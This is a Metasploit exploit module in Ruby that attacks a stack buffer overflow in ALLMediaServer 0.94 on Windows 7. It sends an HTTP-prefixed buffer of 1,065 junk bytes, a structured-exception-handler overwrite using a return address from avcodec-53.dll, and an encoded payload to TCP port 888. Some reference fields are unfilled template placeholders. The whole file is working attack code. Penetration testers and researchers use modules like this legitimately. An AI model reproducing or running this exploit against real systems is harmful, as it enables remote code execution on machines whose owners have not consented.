##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  #Rank definition: http://dev.metasploit.com/redmine/projects/framework/wiki/Exploit_Ranking
  #ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'ALLMediaServer 0.94 Buffer Overflow Exploit',
      'Description'  => %q{
          This module exploits a stack buffer overflow in ALLMediaServer 0.94. The vulnerability
                    is caused due to a boundary error within the handling of HTTP request.
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
          'metacom<metacom27[at]gmail.com>',  # Original discovery
          '<metacom>',  # MSF Module
                                         'RST',
        ],
      'References'  =>
        [
          [ 'OSVDB', '<insert OSVDB number here>' ],
          [ 'CVE', 'insert CVE number here' ],
          [ 'URL', 'http://www.bugsearch.net/en/14147/allmediaserver-094-seh-overflow-exploit.html' ]
        ],
      'DefaultOptions' =>
        {
          'ExitFunction' => 'process', #none/process/thread/seh
          #'InitialAutoRunScript' => 'migrate -f',
        },
      'Platform'  => 'win',
      'Payload'  =>
        {
          'BadChars' => "\x00", # <change if needed>
          'DisableNops' => true,
        },

      'Targets'    =>
        [
          [ 'Windows 7',# Tested on: Windows 7 SP1/SP0
            {
              'Ret'     =>  0x65EC24CA, # pop eax # pop ebx # ret  - avcodec-53.dll
              'Offset'  =>  1065
            }
          ],
        ],
      'Privileged'  => false,
      #Correct Date Format: "M D Y"
      #Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec
      'DisclosureDate'  => 'Mar 28 2013',
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(888)], self.class)

  end

  def exploit


    connect
        buffer = "http://"
    buffer << rand_text(target['Offset'])  #junk
    buffer << generate_seh_record(target.ret)
    buffer << payload.encoded  #3931 bytes of space
    # more junk may be needed to trigger the exception

    print_status("Sending payload to ALLMediaServer on #{target.name}...")
    sock.put(buffer)

    handler
    disconnect

  end
end
